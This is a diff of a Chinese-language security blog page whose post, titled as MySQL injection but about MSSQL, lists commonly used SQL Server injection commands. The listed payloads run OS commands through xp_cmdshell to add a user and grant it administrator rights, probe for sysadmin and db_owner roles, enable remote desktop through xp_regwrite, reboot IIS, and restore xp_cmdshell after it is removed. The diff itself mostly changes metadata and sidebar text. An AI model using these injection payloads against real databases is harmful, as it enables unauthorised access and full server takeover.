@@ -84,22 +84,16 @@
 
 
 
-<meta name="description" content="mssql注入经常使用的命令查看是否存在xp_cmdshelland 1=(select count(*) from master.dbo.sysobjects where xtype = ‘x’ and name = ‘xp_cmdshell’)
-用xp_cmdshell执行命令;exec master..xp_cmdshell “net user name password /add”–
-;e">
+<meta name="description" content="mssql注入经常使用的命令查看是否存在xp_cmdshelland 1=(select count(*) from master.dbo.sysobjects where xtype = ‘x’ and name = ‘xp_cmdshell’)">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Mysql注入思考">
 <meta property="og:url" content="http://lovexiaofeng.cn/2016/07/28/24/index.html">
 <meta property="og:site_name" content="小峰's Blog">
-<meta property="og:description" content="mssql注入经常使用的命令查看是否存在xp_cmdshelland 1=(select count(*) from master.dbo.sysobjects where xtype = ‘x’ and name = ‘xp_cmdshell’)
-用xp_cmdshell执行命令;exec master..xp_cmdshell “net user name password /add”–
-;e">
-<meta property="og:updated_time" content="2016-07-29T12:10:02.649Z">
+<meta property="og:description" content="mssql注入经常使用的命令查看是否存在xp_cmdshelland 1=(select count(*) from master.dbo.sysobjects where xtype = ‘x’ and name = ‘xp_cmdshell’)">
+<meta property="og:updated_time" content="2016-07-30T11:30:36.396Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mysql注入思考">
-<meta name="twitter:description" content="mssql注入经常使用的命令查看是否存在xp_cmdshelland 1=(select count(*) from master.dbo.sysobjects where xtype = ‘x’ and name = ‘xp_cmdshell’)
-用xp_cmdshell执行命令;exec master..xp_cmdshell “net user name password /add”–
-;e">
+<meta name="twitter:description" content="mssql注入经常使用的命令查看是否存在xp_cmdshelland 1=(select count(*) from master.dbo.sysobjects where xtype = ‘x’ and name = ‘xp_cmdshell’)">
 
 
 
@@ -263,7 +257,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">发表于</span>
+            <span class="post-meta-item-text">更新于</span>
             <time itemprop="dateCreated" datetime="2016-07-28T17:25:06+08:00" content="2016-07-28">
               2016-07-28
             </time>
@@ -293,7 +287,8 @@
 
       
         <h3 id="mssql注入经常使用的命令"><a href="#mssql注入经常使用的命令" class="headerlink" title="mssql注入经常使用的命令"></a>mssql注入经常使用的命令</h3><h2 id="查看是否存在xp-cmdshell"><a href="#查看是否存在xp-cmdshell" class="headerlink" title="查看是否存在xp_cmdshell"></a>查看是否存在xp_cmdshell</h2><pre><code>and 1=(select count(*) from master.dbo.sysobjects where xtype = ‘x’ and name = ‘xp_cmdshell’)
-</code></pre><h2 id="用xp-cmdshell执行命令"><a href="#用xp-cmdshell执行命令" class="headerlink" title="用xp_cmdshell执行命令"></a>用xp_cmdshell执行命令</h2><pre><code>;exec master..xp_cmdshell “net user name password /add”–
+</code></pre><a id="more"></a> 
+<h2 id="用xp-cmdshell执行命令"><a href="#用xp-cmdshell执行命令" class="headerlink" title="用xp_cmdshell执行命令"></a>用xp_cmdshell执行命令</h2><pre><code>;exec master..xp_cmdshell “net user name password /add”–
 ;exec master..xp_cmdshell “net localgroup name administrators /add”–
 </code></pre><h2 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h2><pre><code>and (select IS_SRVROLEMEMBER(‘sysadmin’))=1–  //sa
 and (select IS_MEMBER(‘db_owner’))=1–   //  dbo
@@ -308,8 +303,7 @@ and (select IS_MEMBER(‘public’))=1–  //public
 ;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite @r,’system\currentcontrolset\services\termservice’,’start’,’reg_dword’,2;—-
 ;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite ‘hkey_users’,’.default\keyboard layout\toggle’,’hotkey’,’reg_sz’,’1′;—-
 ;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_cmdshell ‘iisreset /reboot’;—-
-</code></pre><a id="more"></a>
-<h2 id="xp-cmdshell的删除及恢复"><a href="#xp-cmdshell的删除及恢复" class="headerlink" title="xp_cmdshell的删除及恢复"></a>xp_cmdshell的删除及恢复</h2><h4 id="1、恢复xp-cmdshell的方法"><a href="#1、恢复xp-cmdshell的方法" class="headerlink" title="1、恢复xp_cmdshell的方法"></a>1、恢复xp_cmdshell的方法</h4><p>删除扩展存储过过程xp_cmdshell的语句   </p>
+</code></pre><h2 id="xp-cmdshell的删除及恢复"><a href="#xp-cmdshell的删除及恢复" class="headerlink" title="xp_cmdshell的删除及恢复"></a>xp_cmdshell的删除及恢复</h2><h4 id="1、恢复xp-cmdshell的方法"><a href="#1、恢复xp-cmdshell的方法" class="headerlink" title="1、恢复xp_cmdshell的方法"></a>1、恢复xp_cmdshell的方法</h4><p>删除扩展存储过过程xp_cmdshell的语句   </p>
 <pre><code>exec sp_dropextendedproc ’xp_cmdshell’  
 </code></pre><h4 id="2、恢复cmdshell的sql语句"><a href="#2、恢复cmdshell的sql语句" class="headerlink" title="2、恢复cmdshell的sql语句"></a>2、恢复cmdshell的sql语句</h4><pre><code>exec sp_addextendedproc xp_cmdshell ,@dllname =’xplog70.dll’  
 exec master.dbo.addextendedproc ’xp_cmdshell’,’xplog70.dll’;select count(*) from master.dbo.sysobjects where xtype=’x’ and   
@@ -431,7 +425,7 @@ dbcc addextendedproc (“xp_cmdshell”,”xplog70.dll”)
             文章目录
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview">
-            站点概览
+            博主简介
           </li>
         </ul>
       
@@ -514,6 +508,40 @@ dbcc addextendedproc (“xp_cmdshell”,”xplog70.dll”)
 
         
         
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://leelie.github.io" title="伟哥's Blog" target="_blank">伟哥's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz/" title="加油、未来's Blog" target="_blank">加油、未来's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://scorpoin.github.io" title="棟棟's Blog" target="_blank">棟棟's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.sina.com.cn/u/5619564526" title="磊磊's Blog" target="_blank">磊磊's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://liulangdelmao.github.io/" title="小卓's Blog" target="_blank">小卓's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://nouername.github.io" title="飞妹妹's Blog" target="_blank">飞妹妹's Blog</a>
+                </li>
+              
+            </ul>
+          </div>
+        
 
       </section>
 
@@ -551,13 +579,13 @@ dbcc addextendedproc (“xp_cmdshell”,”xplog70.dll”)
 </div>
 
 <div class="powered-by">
-  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+  由 <a class="theme-link" href="https://lovexiaofeng.cn">小峰</a> 强力推荐
 </div>
 
 <div class="theme-info">
-  主题 -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Pisces
+  博主 -
+  <a class="theme-link" href="https://lovexiaofeng.cn">
+    小峰
   </a>
 </div>
 
